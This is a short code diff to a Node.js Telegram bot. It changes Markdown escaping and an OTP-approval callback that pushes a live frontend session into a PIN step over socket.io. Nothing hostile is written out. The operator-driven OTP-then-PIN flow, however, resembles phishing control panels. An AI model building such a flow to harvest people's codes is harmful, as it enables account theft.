@@ -13,10 +13,11 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 /**
  * Strips out characters that break Telegram Markdown parsing
+ * FIX: Removed hyphen escaping to prevent App ID string corruption (e.g., COD-XXXXX)
  */
 function escapeMarkdown(text) {
     if (!text) return '';
-    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
+    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
 }
 
 /**
@@ -105,7 +106,7 @@ bot.on('callback_query', async (callbackQuery) => {
         return;
     }
 
-    // FIX BUG 2: Change emission to match frontend tracking listener 'admin-approve-otp'
+    // Process matching clean room keys directly now
     if (actionSignal === 'approve_otp') {
         global.io.to(targetAppId).emit('admin-approve-otp');
         auditLogExecutionState = "✅ OTP status verified. Frontend shifted to secure PIN mode.";
